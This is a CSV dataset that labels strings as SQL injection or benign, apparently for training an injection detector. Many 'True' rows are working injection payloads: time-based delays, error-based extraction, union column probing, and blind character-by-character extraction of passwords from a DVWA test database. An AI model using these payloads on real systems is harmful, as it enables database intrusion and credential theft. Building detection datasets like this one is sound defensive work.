Query,SQLIA
"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",True
"1'  )   where 2725  =  2725 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",True
"  UPDATE making SET had =  'know', City =  'means' WHERE mind =  object",False
"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",True
"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""wfwg"" like ""wfwg",True
pompa,False
1'  )   as gogu where 4338  =  4338 union all select null#,True
SELECT TOP 3 * FROM everyone SELECT * FROM music 3SELECT * FROM completely,False
SELECT TOP 3 * FROM circle WHERE fed = 'sport',False
SELECT * FROM certain WHERE trouble = 'thou',False
10263,False
"  SELECT TIME_FORMAT ( ""19:30:10"", ""%T"" ) ;",False
mohandas,False
calle la salina 7 1?b,False
SELECT * FROM president,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),1,1))>49 AND 'znpp'='znpp",True
48748000y,False
1'+  (  select qdon where 9453  =  9453,True
"  SELECT YEARWEEK ( ""2017-10-25"" ) ;",False
"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",True
SELECT * FROM becoming WHERE hunter IN  ( SELECT thin FROM guess ) ,False
"  SELECT eatID AS ID, all AS hot FROM earlier",False
kava_ivic@comercioenlacalle.info,False
"-2028'   )    )     )   union all select 8698,8698,8698,8698#",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),8,1))>24 AND 'uEgY'='uEgY",True
50422961s,False
10700,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 0,1),3,1))>108 AND 'lHsL'='lHsL",True
SELECT * FROM  ( SELECT beginning FROM gold ) ,False
grodecki,False
SELECT * FROM cry,False
SELECT * FROM Customers   WHERE Country IN  ( SELECT Country FROM Suppliers ) ;,False
" SELECT * FROM finish ORDER BY cow, sound",False
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ossj'  =  'ossj",True
SELECT nearly ( s )  FROM round LEFT JOIN,False
rittenho,False
cele959n3s0o,False
"-7323%"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,True
"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",True
SELECT TOP 50 PERCENT * FROM popular,False
SELECT * FROM cause WHERE atomic = 'plural',False
SELECT help ( s )  FROM particular,False
"1   )    )    as vycb where 3524  =  3524 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",True
SELECT travel ( s )  FROM kind FULL OUTER JOIN,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(first_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),1,1))>104 AND 'gHrb'='gHrb",True
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",True
padoan@directoriogratuito.et,False
DELETE FROM social,False
SELECT COUNT ( giveID ) FROM neighborhood,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),11,1))>47 AND 'Tfyt'='Tfyt",True
"   SELECT piece,lunch,rush,information,part     (  (  definition JOIN value ON bad.silver =  plant.vegetable )   INNER JOIN sidesON Orders.wall =  vote.baseID ) ",False
arroldo,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),19,1))>114 AND 'TszS'='TszS",True
a2o2e5,False
"1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",True
" SELECT CONCAT_WS ( "" "", Address, PostalCode, City )  AS Address FROM  Customers;",False
62258107m,False
tenuta,False
"1'||  (  select 'wcad' from dual where 4262  =  4262 and elt  (  3114  =  3114,sleep  (  5   )    )   #",True
agobiar,False
SELECT * FROM  ( SELECT treated FROM naturally ) ,False
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""pxix""  =  ""pxix",True
kenji,False
"-3364%""   )    )     )   union all select 5464--",True
oliveira,False
8.87551E+14,False
SELECT * FROM lady ORDER BY positive,False
SELECT build ( s )  FROM experiment UNION ALL,False
SELECT * FROM add WHERE wealth BETWEEN '1996-07-01' AND '1996-07-31',False
SELECT youth ( s )  FROM tape UNION,False
SELECT * FROM letter WHERE Price NOT BETWEEN 10 AND 20,False
-7675%'   )    )     )   order by 1--,True
SELECT * FROM mood WHERE copper BETWEEN '1996-07-01' AND '1996-07-31',False
milton,False
17154,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),10,1))>94 AND 'TkwJ'='TkwJ",True
SELECT COUNT ( union ) FROM these,False
select   (  case when   (  1776  =  7688  )   then 1776 else 1/  (  select 0  )   end  )  --,True
"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",True
SELECT * FROM worker WHERE heading = 'due' FETCH FIRST 3 ROWS ONLY,False
""" or """"-""",True
2.27852E+15,False
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20,False
1'   )    )    and 6690  =  3250#,True
vasilescu.lisi@drogasvirtuales.sc,False
FROM  ( SELECT DISTINCT roll FROM independent ) ,False
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),26,1))>54 AND 'TkwJ'='TkwJ",True
1 where 6304  =  6304,True
"INSERT INTO grow ( shall, kill, paragraph, spirit, recall, if )  VALUES  ( 'goose', 'speed'. spent', 'lesson', 'season', 'many', 'salmon' )  ",False
SELECT MIN ( positive )  AS soap FROM doubt,False
"  SELECT DATEDIFF ( ""2017-06-25"", ""2017-06-15"" ) ;",False
diy$ambo,False
almazora/almassora,False
SELECT sink ( s )  FROM purpose SELECT easy ( s ) ,False
"1'||  (  select 'ojdz' where 7350  =  7350 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),1,1))>76 AND 'ybro'='ybro",True
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""obau""  =  ""obau",True
corbo gornes,False
consell,False
1'||  (  select 'tezo' from dual where 4436  =  4436,True
DELETE FROM charge,False
mirabel,False
"   SELECT swept, day, chain FROM nothing WHERE happily  IS NULL",False
manquel,False
"INSERT INTO onto ( bite, slope, refer, duck, draw, rock )  VALUES  ( 'fight', 'needs'. motion', 'else', 'tribe', 'bark', 'another' )  ",False
1' where 8635  =  8635 order by 1--,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),17,1))>110 AND 'uEgY'='uEgY",True
zelda_hjelm5@silver-knights.it,False
"-9111"" or 3038  =  3038",True
SELECT * FROM harder  WHERE according = birth,False
-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,True
babasaki,False
48600,False
SELECT column_name FROM table1 UNION ALL,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),13,1))>87 AND 'uBuU'='uBuU",True
"   SELECT COUNT ( character ) , poor FROM curious BY fort",False
"1  )   where 7600  =  7600 union all select null,null,null,null,null,null--",True
49626,False
1 where 9752  =  9752,True
"-5691' union all select 6610,6610#",True
63a5et5192,False
"1'+  (  select 'ndpx' where 4061  =  4061 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",True
SELECT Count ( * )  AS mission,False
"c/ virgen de la almudena, 61 12?c",False
"1%""   )    )     )   rlike sleep  (  5  )  #",True
"1%""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""%""  =  """,True
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,True
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",True
8.93682E+15,False
"grup de la pau, 108,",False
melanson,False
1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,True
1%' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  ',True
1%'   )    )    union all select null--,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),16,1))>52 AND 'bSNt'='bSNt",True
lemieux4,False
34830,False
haddon@hiperbarcelona.tl,False
4.23384E+15,False
v433g3o5i6r79,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),21,1))>42 AND 'TszS'='TszS",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),1,1))>56 AND 'uBuU'='uBuU",True
SELECT week ( s )  FROM outside SELECT pot FROM during,False
8.2197E+15,False
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/template-compare.php' ORDER BY wp_posts.post_title ASC,False
SELECT * FROM knowledge WHERE left NOT LIKE 'composed%',False
1  )   and 9198  =  9198--,True
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7074 )  ORDER BY meta_id ASC",False
"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),12,1))>112 AND 'TszS'='TszS",True
"1%'  )   union all select null,null,null,null,null,null,null,null#",True
1%'  )   order by 1--,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),2,1))>57 AND 'znpp'='znpp",True
"1%""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,True
"1""   )    )    as sqow where 8752  =  8752",True
"  SELECT except,he,extra FROM child LEFT JOIN Orders ON market.classID =  palace.dead ORDER BY course.leader",False
alysia,False
8.32456E+15,False
SELECT MIN ( shut )  AS jet FROM usually,False
SELECT police ( s )  FROM luck SELECT not FROM exist,False
SELECT * FROM return WHERE substance LIKE '%largest%',False
SELECT COUNT ( couldID ) FROM rocket,False
SELECT * FROM include WHERE strip = 'eager'  AND  ( flat = 'positive' OR fighting = 'drop' ) ,False
"   SELECT Employees.safe, COUNT ( Orders.keptID )  AS quietFROM    ( OrdersINNER JOIN model ON Orders.landID  =  Employees.babyID ) ",False
"-5150   )    )     )   union all select 5660,5660,5660#",True
"1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",True
"1'  )   where 4092  =  4092 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",True
-9429'  )   order by 1--,True
SELECT * FROM invented WHERE mouse IN  ( SELECT fifth FROM fought ) ,False
SELECT * FROM ship  WHERE dinner NOT LIKE '[sentence]%',False
07819871d,False
1' where 1692  =  1692,True
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- bqxe",True
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""rurz""  =  ""rurz",True
SELECT * FROM trap FETCH FIRST 50 PERCENT ROWS ONLY,False
3.09015E+15,False
madrigal del monte,False
"-4807' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --",True
SELECT * FROM using WHERE corner BETWEEN 'bill' AND 'off',False
SELECT AVG ( motor ) FROM silence SELECT SUM ( fix ) ,False
"1"") AND 7916=4024 AND (""yONU""=""yONU",True
SELECT * FROM solve WHERE habit = 'situation',False
"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",True
SELECT * FROM  ( SELECT original FROM wall ) ,False
1s,True
"1'  )   where 6489  =  6489 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",True
"1""   )    )    as qode where 2398  =  2398 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",True
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 4069 )  ORDER BY meta_id ASC",False
quisto,False
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'mfib'  =  'mfib",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),22,1))>112 AND 'uEgY'='uEgY",True
SELECT * FROM give WHERE slabs = 'property' LIMIT 3,False
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",True
SELECT * FROM sudden,False
"-4932%""   )    )    or   (  3076  =  5927  )  *5927 and    (    (   ""%""  =  """,True
1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,True
SELECT * FROM without WHERE managed = 'higher'  OR stick = 'biggest',False
"-2256""   )    )     )   or 1971  =  4537#",True
"INSERT INTO page  ( flew, reach, printed )  VALUES  ( 'baby', 'bush', 'unhappy' )  ",False
8.77345E+15,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),25,1))>87 AND 'epJT'='epJT",True
SELECT test ( s )  FROM open FULL OUTER JOIN,False
SELECT AVG ( Price ) FROM drink,False
-1499  )   as gxfm where 9762  =  9762 or 5989  =  4782--,True
"   SELECT nothing, like+ ', ' + represent+ ' ' + success+ ', ' + gray AS battle  FROM birth",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(failed_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>47 AND 'rXdW'='rXdW",True
1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',True
brooking-doolittle@encuentrodominios.lv,False
"1  )   union all select null,null,null,null,null,null,null,null--",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>100 AND 'vyMm'='vyMm",True
8.54124E+15,False
leonella,False
SELECT AVG ( favorite ) FROM softly,False
1'||  (  select 'yezk' where 2097  =  2097,True
SELECT AVG ( opposite )  FROM strike  SELECT SUM ( excitement ) ,False
"  SELECT windowID AS ID, plus AS passage FROM frozen",False
select sleep  (  5  )   and   (  4863  =  4863,True
deying,False
SELECT heading,False
"c/ fontans, 124, 10?c",False
"1'   )    )    as sxpk where 5524  =  5524 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",True
lo7ange,False
6.4671E+15,False
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),13,1))>56 AND 'uBuU'='uBuU",True
" SELECT column_name ( s )  FROM old,triangle",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),8,1))>47 AND 'uBuU'='uBuU",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),7,1))>102 AND 'epJT'='epJT",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 4,1),8,1))>98 AND 'ESxF'='ESxF",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),15,1))>1 AND 'hBNb'='hBNb",True
1'   )    )     )   and 2006  =  2006,True
brihuega,False
"1 where 2031  =  2031 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",True
"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",True
1' and 5835  =  6157 and 'bjee' like 'bjee,True
1%'   )    )     )   or sleep  (  5  )   and    (    (     (  '%'  =  ',True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),20,1))>116 AND 'IlVZ'='IlVZ",True
"1   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",True
edelmar,False
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""duuw""  =  ""duuw",True
